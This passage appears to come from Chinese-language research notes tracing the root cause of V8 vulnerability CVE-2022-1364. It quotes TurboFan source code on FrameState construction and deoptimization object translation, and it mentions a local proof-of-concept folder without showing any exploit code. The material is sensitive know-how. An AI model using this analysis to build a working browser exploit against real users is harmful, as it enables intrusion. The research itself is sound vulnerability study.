</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    parameters_state_values_ <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        GetStateValuesFromCache(<span style="color:#f92672">&amp;</span>values()<span style="color:#f92672">-&gt;</span>at(<span style="color:#ae81ff">0</span>), parameter_count(), <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    UpdateStateValues(<span style="color:#f92672">&amp;</span>parameters_state_values_, <span style="color:#f92672">&amp;</span>values()<span style="color:#f92672">-&gt;</span>at(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>                      parameter_count());
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> registers_state_values <span style="color:#f92672">=</span> GetStateValuesFromCache(
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;</span>values()<span style="color:#f92672">-&gt;</span>at(register_base()), register_count(), liveness);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> accumulator_is_live <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>liveness <span style="color:#f92672">||</span> liveness<span style="color:#f92672">-&gt;</span>AccumulatorIsLive();
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> accumulator_state_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      accumulator_is_live <span style="color:#f92672">&amp;&amp;</span> combine <span style="color:#f92672">!=</span> OutputFrameStateCombine<span style="color:#f92672">::</span>PokeAt(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">?</span> values()<span style="color:#f92672">-&gt;</span>at(accumulator_base())
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">:</span> builder()<span style="color:#f92672">-&gt;</span>jsgraph()<span style="color:#f92672">-&gt;</span>OptimizedOutConstant();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> Operator<span style="color:#f92672">*</span> op <span style="color:#f92672">=</span> common()<span style="color:#f92672">-&gt;</span>FrameState(
</span></span><span style="display:flex;"><span>      bailout_id, combine, builder()<span style="color:#f92672">-&gt;</span>frame_state_function_info());
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> result <span style="color:#f92672">=</span> graph()<span style="color:#f92672">-&gt;</span>NewNode(
</span></span><span style="display:flex;"><span>      op, parameters_state_values_, registers_state_values,
</span></span><span style="display:flex;"><span>      accumulator_state_value, Context(), builder()<span style="color:#f92672">-&gt;</span>GetFunctionClosure(),
</span></span><span style="display:flex;"><span>      builder()<span style="color:#f92672">-&gt;</span>graph()<span style="color:#f92672">-&gt;</span>start());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> BytecodeGraphBuilder<span style="color:#f92672">::</span>Environment<span style="color:#f92672">::</span>UpdateStateValues(Node<span style="color:#f92672">**</span> state_values,
</span></span><span style="display:flex;"><span>                                                          Node<span style="color:#f92672">**</span> values,
</span></span><span style="display:flex;"><span>                                                          <span style="color:#66d9ef">int</span> count) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (StateValuesRequireUpdate(state_values, values, count)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> Operator<span style="color:#f92672">*</span> op <span style="color:#f92672">=</span> common()<span style="color:#f92672">-&gt;</span>StateValues(count, SparseInputMask<span style="color:#f92672">::</span>Dense());
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>state_values) <span style="color:#f92672">=</span> graph()<span style="color:#f92672">-&gt;</span>NewNode(op, count, values);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> Operator<span style="color:#f92672">*</span> CommonOperatorBuilder<span style="color:#f92672">::</span>StateValues(<span style="color:#66d9ef">int</span> arguments,
</span></span><span style="display:flex;"><span>                                                   SparseInputMask bitmask) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (bitmask.IsDense()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (arguments) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CACHED_STATE_VALUES(arguments) \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  case arguments:                      \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    return &amp;cache_.kStateValues##arguments##Operator;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      CACHED_STATE_VALUES_LIST(CACHED_STATE_VALUES)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#undef CACHED_STATE_VALUES
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK(bitmask.IsDense() <span style="color:#f92672">||</span> bitmask.CountReal() <span style="color:#f92672">==</span> arguments);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Uncached.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">zone</span>()<span style="color:#f92672">-&gt;</span>New<span style="color:#f92672">&lt;</span>Operator1<span style="color:#f92672">&lt;</span>SparseInputMask<span style="color:#f92672">&gt;&gt;</span>(  <span style="color:#75715e">// --
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      IrOpcode<span style="color:#f92672">::</span>kStateValues, Operator<span style="color:#f92672">::</span>kPure,     <span style="color:#75715e">// opcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#e6db74">&#34;StateValues&#34;</span>,                               <span style="color:#75715e">// name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      arguments, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,                    <span style="color:#75715e">// counts
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      bitmask);                                    <span style="color:#75715e">// parameter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Issues:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Scopes - intimately tied to AST. Need to eval what is needed.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Need to resolve closure parameter treatment.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BytecodeGraphBuilder<span style="color:#f92672">::</span>Environment<span style="color:#f92672">::</span>Environment(
</span></span><span style="display:flex;"><span>    BytecodeGraphBuilder<span style="color:#f92672">*</span> builder, <span style="color:#66d9ef">int</span> register_count, <span style="color:#66d9ef">int</span> parameter_count,
</span></span><span style="display:flex;"><span>    interpreter<span style="color:#f92672">::</span>Register incoming_new_target_or_generator,
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> control_dependency)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">:</span> builder_(builder),
</span></span><span style="display:flex;"><span>      register_count_(register_count),
</span></span><span style="display:flex;"><span>      parameter_count_(parameter_count),
</span></span><span style="display:flex;"><span>      control_dependency_(control_dependency),
</span></span><span style="display:flex;"><span>      effect_dependency_(control_dependency),
</span></span><span style="display:flex;"><span>      values_(builder<span style="color:#f92672">-&gt;</span>local_zone()),
</span></span><span style="display:flex;"><span>      parameters_state_values_(<span style="color:#66d9ef">nullptr</span>),
</span></span><span style="display:flex;"><span>      generator_state_(<span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// The layout of values_ is:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// [receiver] [parameters] [registers] [accumulator]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// parameter[0] is the receiver (this), parameters 1..N are the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// parameters supplied to the method (arg0..argN-1). The accumulator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// is stored separately.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Parameters including the receiver
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> parameter_count; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> debug_name <span style="color:#f92672">=</span> (i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;%this&#34;</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">nullptr</span>;
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> parameter <span style="color:#f92672">=</span> builder<span style="color:#f92672">-&gt;</span>GetParameter(i, debug_name);
</span></span><span style="display:flex;"><span>    values()<span style="color:#f92672">-&gt;</span>push_back(parameter);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Registers
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  register_base_ <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(values()<span style="color:#f92672">-&gt;</span>size());
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> undefined_constant <span style="color:#f92672">=</span> builder<span style="color:#f92672">-&gt;</span>jsgraph()<span style="color:#f92672">-&gt;</span>UndefinedConstant();
</span></span><span style="display:flex;"><span>  values()<span style="color:#f92672">-&gt;</span>insert(values()<span style="color:#f92672">-&gt;</span>end(), register_count, undefined_constant);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Accumulator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  accumulator_base_ <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(values()<span style="color:#f92672">-&gt;</span>size());
</span></span><span style="display:flex;"><span>  values()<span style="color:#f92672">-&gt;</span>push_back(undefined_constant);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Context
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> context_index <span style="color:#f92672">=</span> Linkage<span style="color:#f92672">::</span>GetJSCallContextParamIndex(parameter_count);
</span></span><span style="display:flex;"><span>  context_ <span style="color:#f92672">=</span> builder<span style="color:#f92672">-&gt;</span>GetParameter(context_index, <span style="color:#e6db74">&#34;%context&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Incoming new.target or generator register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (incoming_new_target_or_generator.is_valid()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> new_target_index <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        Linkage<span style="color:#f92672">::</span>GetJSCallNewTargetParamIndex(parameter_count);
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> new_target_node <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        builder<span style="color:#f92672">-&gt;</span>GetParameter(new_target_index, <span style="color:#e6db74">&#34;%new.target&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> values_index <span style="color:#f92672">=</span> RegisterToValuesIndex(incoming_new_target_or_generator);
</span></span><span style="display:flex;"><span>    values()<span style="color:#f92672">-&gt;</span>at(values_index) <span style="color:#f92672">=</span> new_target_node;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Node<span style="color:#f92672">*</span> BytecodeGraphBuilder<span style="color:#f92672">::</span>GetParameter(<span style="color:#66d9ef">int</span> parameter_index,
</span></span><span style="display:flex;"><span>                                         <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> debug_name_hint) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// We use negative indices for some parameters.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK_LE(ParameterInfo<span style="color:#f92672">::</span>kMinIndex, parameter_index);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> size_t index <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>size_t<span style="color:#f92672">&gt;</span>(parameter_index <span style="color:#f92672">-</span> ParameterInfo<span style="color:#f92672">::</span>kMinIndex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cached_parameters_.size() <span style="color:#f92672">&lt;=</span> index) {
</span></span><span style="display:flex;"><span>    cached_parameters_.resize(index <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cached_parameters_[index] <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>    cached_parameters_[index] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        NewNode(common()<span style="color:#f92672">-&gt;</span>Parameter(parameter_index, debug_name_hint),
</span></span><span style="display:flex;"><span>                graph()<span style="color:#f92672">-&gt;</span>start());
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> cached_parameters_[index];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>TODO:</p>
<ul>
<li>inline 的时候对 param 有没有特殊处理</li>
<li>到底是什么地方的 FrameState 最后被使用了</li>
</ul>
<p>js-inlining.cc:716, 创建了一个特殊的 FrameState，里面保存了调用函数的参数的信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>  <span style="color:#75715e">// Insert argument adaptor frame if required. The callees formal parameter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// count have to match the number of arguments passed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// to the call.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> parameter_count <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      shared_info<span style="color:#f92672">-&gt;</span>internal_formal_parameter_count_without_receiver();
</span></span><span style="display:flex;"><span>  DCHECK_EQ(parameter_count, start.FormalParameterCountWithoutReceiver());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (call.argument_count() <span style="color:#f92672">!=</span> parameter_count) {
</span></span><span style="display:flex;"><span>    frame_state <span style="color:#f92672">=</span> CreateArtificialFrameState(
</span></span><span style="display:flex;"><span>        node, frame_state, call.argument_count(), BytecodeOffset<span style="color:#f92672">::</span>None(),
</span></span><span style="display:flex;"><span>        FrameStateType<span style="color:#f92672">::</span>kArgumentsAdaptor, <span style="color:#f92672">*</span>shared_info);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">InlineCall</span>(node, new_target, context, frame_state, start, end,
</span></span><span style="display:flex;"><span>                    exception_target, uncaught_subcalls, call.argument_count());
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Pc() -&gt; SafePointTable -&gt; SafePointEntry -&gt; DeoptIndex -&gt; DeoptData -&gt; Translate -&gt; FrameSummary</p>
<hr>
<p>调试环境</p>
<ul>
<li>
<p>F:\chromium_exp\chromium_exp\CVE-2022-1364\poc</p>
</li>
<li>
<p>F:\v8\v8\</p>
</li>
<li>
<p>todo: tools to visualize tq structure</p>
</li>
<li>
<p>kFlags_deoptimize means? DeoptmizeIf/DeoptmizeUnless =&gt; OpcodeXxxCmp/Test |= kFlags_deoptimize</p>
</li>
</ul>
<hr>
<p>了解了这些信息后，我们再从错误发生的点开始，往前回溯整个流程。</p>
<p>对象被错误的实例化，发生在 <code>translate-state.cc:TranslatedValue::GetValue()</code> 函数中，正在处理的当前对象类型为 <code>TranslateValue::kDuplicatedObject</code>，代表栈的此位置上存放的是一个栈中其他地方已经存在的对象，所以 translationArray 中只存放了对象的 id, 这个 id 指向了另一个栈上的 <code>TranslateValue::kCapturedObject</code> 对象所在的位置，之后程序调用 <code>TranslatedState::EnsureObjectAllocatedAt</code> 函数来恢复这个 <code>kCapturedObject</code>。</p>
<pre tabindex="0"><code></code></pre><p><code>kDuplicatedObject</code> 和 <code>kCapturedObject</code> 的类型，都是在 instruction-selector</p>
<p><code>kCapturedObject</code> 和 <code>kDuplicatedObject</code> 来自代码生成阶段执行的 <code>CodeGenerator::TranlateStateValueDescriptor</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> CodeGenerator<span style="color:#f92672">::</span>TranslateStateValueDescriptor(
</span></span><span style="display:flex;"><span>    StateValueDescriptor<span style="color:#f92672">*</span> desc, StateValueList<span style="color:#f92672">*</span> nested,
</span></span><span style="display:flex;"><span>    InstructionOperandIterator<span style="color:#f92672">*</span> iter) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (desc<span style="color:#f92672">-&gt;</span>IsNested()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 这里写入 kCapturedObject
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    translations_.BeginCapturedObject(<span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(nested<span style="color:#f92672">-&gt;</span>size()));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> field : <span style="color:#f92672">*</span>nested) {
</span></span><span style="display:flex;"><span>      TranslateStateValueDescriptor(field.desc, field.nested, iter);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsArgumentsElements()) {
</span></span><span style="display:flex;"><span>    translations_.ArgumentsElements(desc<span style="color:#f92672">-&gt;</span>arguments_type());
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsArgumentsLength()) {
</span></span><span style="display:flex;"><span>    translations_.ArgumentsLength();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsDuplicate()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 这里写入 kDuplicateObejct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    translations_.DuplicateObject(<span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(desc<span style="color:#f92672">-&gt;</span>id()));
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsPlain()) {
</span></span><span style="display:flex;"><span>    InstructionOperand<span style="color:#f92672">*</span> op <span style="color:#f92672">=</span> iter<span style="color:#f92672">-&gt;</span>Advance();
</span></span><span style="display:flex;"><span>    AddTranslationForOperand(iter<span style="color:#f92672">-&gt;</span>instruction(), op, desc<span style="color:#f92672">-&gt;</span>type());
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    DCHECK(desc<span style="color:#f92672">-&gt;</span>IsOptimizedOut());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (optimized_out_literal_id_ <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        optimized_out_literal_id_ <span style="color:#f92672">=</span> DefineDeoptimizationLiteral(
</span></span><span style="display:flex;"><span>            DeoptimizationLiteral(isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>optimized_out()));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      translations_.StoreLiteral(optimized_out_literal_id_);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> TranslationArrayBuilder<span style="color:#f92672">::</span>BeginCapturedObject(<span style="color:#66d9ef">int</span> length) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">auto</span> opcode <span style="color:#f92672">=</span> TranslationOpcode<span style="color:#f92672">::</span>CAPTURED_OBJECT;
</span></span><span style="display:flex;"><span>  Add(opcode);
</span></span><span style="display:flex;"><span>  Add(length);
</span></span><span style="display:flex;"><span>  DCHECK_EQ(TranslationOpcodeOperandCount(opcode), <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> TranslationArrayBuilder<span style="color:#f92672">::</span>DuplicateObject(<span style="color:#66d9ef">int</span> object_index) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">auto</span> opcode <span style="color:#f92672">=</span> TranslationOpcode<span style="color:#f92672">::</span>DUPLICATED_OBJECT;
</span></span><span style="display:flex;"><span>  Add(opcode);
</span></span><span style="display:flex;"><span>  Add(object_index);
</span></span><span style="display:flex;"><span>  DCHECK_EQ(TranslationOpcodeOperandCount(opcode), <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这个函数从 StateValueDescriptor 和 InstructionOperand 中提取处相应的信息，写入到 translateArray 中。而前面着两个源信息是来自于指令选择阶段对 DeoptimizeUnless/DeoptimizeIf/Call 等节点的处理过程中, 这个处理流程会执行到 <code>InstructionSelector::AppendDeoptimizeArguments</code>, 把与目标关联的 FrameState 节点存储的信息转换成 Descriptor 和 InstructionOperand。</p>
<p>例如处理 Call 节点时，有如下调用栈：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>InstructionSelector<span style="color:#f92672">::</span>AddOperandToStateValueDescriptor(v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>compiler<span style="color:#f92672">::</span>StateValueList <span style="color:#f92672">*</span>)
</span></span><span style="display:flex;"><span>InstructionSelector<span style="color:#f92672">::</span>AddInputsToFrameStateDescriptor(v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>compiler<span style="color:#f92672">::</span>StateValueList <span style="color:#f92672">*</span>)
</span></span><span style="display:flex;"><span>InstructionSelector<span style="color:#f92672">::</span>AddInputsToFrameStateDescriptor(v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>compiler<span style="color:#f92672">::</span>FrameStateDescriptor <span style="color:#f92672">*</span>)
</span></span><span style="display:flex;"><span>InstructionSelector<span style="color:#f92672">::</span>InitializeCallBuffer(v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>compiler<span style="color:#f92672">::</span>Node <span style="color:#f92672">*</span>)
</span></span><span style="display:flex;"><span>InstructionSelector<span style="color:#f92672">::</span>VisitCall(v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>compiler<span style="color:#f92672">::</span>Node <span style="color:#f92672">*</span>)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// Returns the number of instruction operands added to inputs.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>size_t InstructionSelector<span style="color:#f92672">::</span>AddOperandToStateValueDescriptor(
</span></span><span style="display:flex;"><span>    StateValueList<span style="color:#f92672">*</span> values, InstructionOperandVector<span style="color:#f92672">*</span> inputs,
</span></span><span style="display:flex;"><span>    OperandGenerator<span style="color:#f92672">*</span> g, StateObjectDeduplicator<span style="color:#f92672">*</span> deduplicator, Node<span style="color:#f92672">*</span> input,
</span></span><span style="display:flex;"><span>    MachineType type, FrameStateInputKind kind, Zone<span style="color:#f92672">*</span> zone) {
</span></span><span style="display:flex;"><span>  DCHECK_NOT_NULL(input);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (input<span style="color:#f92672">-&gt;</span>opcode()) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kTypedObjectState:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kObjectId: {
</span></span><span style="display:flex;"><span>      size_t id <span style="color:#f92672">=</span> deduplicator<span style="color:#f92672">-&gt;</span>GetObjectId(input);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (id <span style="color:#f92672">==</span> StateObjectDeduplicator<span style="color:#f92672">::</span>kNotDuplicated) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 信息从 kTypedObjectState 节点传递到 values(StateDescriptor) 和 input(InstructionOperand)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        DCHECK_EQ(IrOpcode<span style="color:#f92672">::</span>kTypedObjectState, input<span style="color:#f92672">-&gt;</span>opcode());
</span></span><span style="display:flex;"><span>        size_t entries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        id <span style="color:#f92672">=</span> deduplicator<span style="color:#f92672">-&gt;</span>InsertObject(input);
</span></span><span style="display:flex;"><span>        StateValueList<span style="color:#f92672">*</span> nested <span style="color:#f92672">=</span> values<span style="color:#f92672">-&gt;</span>PushRecursiveField(zone, id);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">const</span> input_count <span style="color:#f92672">=</span> input<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>ValueInputCount();
</span></span><span style="display:flex;"><span>        ZoneVector<span style="color:#f92672">&lt;</span>MachineType<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span> types <span style="color:#f92672">=</span> MachineTypesOf(input<span style="color:#f92672">-&gt;</span>op());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> input_count; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>          entries <span style="color:#f92672">+=</span> AddOperandToStateValueDescriptor(
</span></span><span style="display:flex;"><span>              nested, inputs, g, deduplicator, input<span style="color:#f92672">-&gt;</span>InputAt(i), types<span style="color:#f92672">-&gt;</span>at(i),
</span></span><span style="display:flex;"><span>              kind, zone);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 这里与 kDuplicatedObject 相关
